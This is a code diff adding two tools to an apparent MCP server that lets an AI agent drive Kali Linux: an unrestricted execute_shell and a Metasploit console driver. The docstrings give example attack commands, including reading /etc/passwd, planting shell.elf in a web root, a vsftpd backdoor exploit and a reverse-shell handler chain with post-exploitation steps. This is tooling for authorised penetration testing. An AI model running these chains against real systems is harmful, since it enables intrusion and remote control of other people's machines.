@@ -773,3 +773,84 @@ def register_tools(mcp: FastMCP, kali_client: KaliToolsClient) -> None:
             "duration": duration,
             "use_rlwrap": use_rlwrap,
         })
+    
+    # -----------------------------------------------------------------------
+    # Generic shell command
+    # -----------------------------------------------------------------------
+    @mcp.tool(name="execute_shell")
+    def execute_shell(command: str) -> Dict[str, Any]:
+        """
+        Run any shell command on the Kali server and return stdout/stderr.
+
+        Use this as an escape hatch when no dedicated tool covers your need:
+          - File operations:   execute_shell("cat /etc/passwd")
+          - Move files:        execute_shell("cp /tmp/shell.elf /var/www/html/")
+          - Check processes:   execute_shell("ps aux | grep msfconsole")
+          - Network state:     execute_shell("ip addr; ip route")
+          - Install tools:     execute_shell("apt-get install -y seclists")
+          - Script execution:  execute_shell("python3 /tmp/exploit.py")
+
+        Prefer dedicated tools (nmap_scan, metasploit_run, etc.) when they
+        exist — they handle argument sanitisation and timeouts correctly.
+
+        Args:
+            command: Full shell command string, piping and redirection supported
+        """
+        return kali_client.execute_command(command)
+
+    # -----------------------------------------------------------------------
+    # Metasploit — interactive TTY session
+    # -----------------------------------------------------------------------
+    @mcp.tool(name="msf_console")
+    def msf_console(
+        commands: list,
+        step_timeout: int = 30,
+        startup_timeout: int = 60,
+        prompt_regex: str = r"msf\d*\s[>\(][^)]*[>\)]\s*$",
+    ) -> Dict[str, Any]:
+        """
+        Drive msfconsole interactively over a real PTY.
+
+        Unlike metasploit_run (which fires a fixed resource script),
+        msf_console sends each command and waits for the msfconsole prompt
+        before sending the next one.  This lets the agent walk through
+        multi-step flows and read output at every stage.
+
+        Workflow examples:
+
+          Basic exploit:
+            commands=["use exploit/unix/ftp/vsftpd_234_backdoor",
+                      "set RHOSTS 10.10.11.5",
+                      "run"]
+
+          Post-exploitation:
+            commands=["sessions",
+                      "sessions -i 1",
+                      "getuid",
+                      "sysinfo",
+                      "background"]
+
+          Full chain:
+            commands=["use exploit/multi/handler",
+                      "set PAYLOAD linux/x64/shell_reverse_tcp",
+                      "set LHOST 10.10.14.5",
+                      "set LPORT 4444",
+                      "run -j",
+                      "sessions",
+                      "sessions -i 1",
+                      "whoami"]
+
+        Args:
+            commands:        Ordered list of msfconsole commands to send
+            step_timeout:    Seconds to wait for the prompt after each command (default 30)
+                             Increase for exploits that take time e.g. 120
+            startup_timeout: Seconds to wait for msfconsole to boot (default 60)
+            prompt_regex:    Regex that matches the msfconsole prompt.
+                             Only change this if your MSF version uses a different prompt.
+        """
+        return kali_client.safe_post("api/tools/msf_console", {
+            "commands":        commands,
+            "step_timeout":    step_timeout,
+            "startup_timeout": startup_timeout,
+            "prompt_regex":    prompt_regex,
+        })
